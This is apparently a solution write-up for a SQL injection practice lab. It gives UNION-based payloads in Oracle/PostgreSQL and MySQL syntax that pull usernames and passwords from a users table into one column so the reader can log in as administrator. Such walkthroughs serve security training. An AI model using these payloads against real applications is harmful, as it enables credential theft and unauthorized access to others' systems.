# Lab: SQL injection UNION attack, retrieving multiple values in a single column (Practitioner)

**Goal:** Retrieve usernames and passwords, concatenating them into a single column.

## Solution

1. Confirm columns (usually 2, only one accepts text).
2. Use string concatenation:

**Oracle / PostgreSQL style (common in labs):**

```
' UNION SELECT NULL, username || ':' || password FROM users--
```

**MySQL style:**

```
' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--
```

3. Extract administrator credentials and log in.

## Payload (most common for this lab)

```
' UNION SELECT NULL, username || ':' || password FROM users--
```
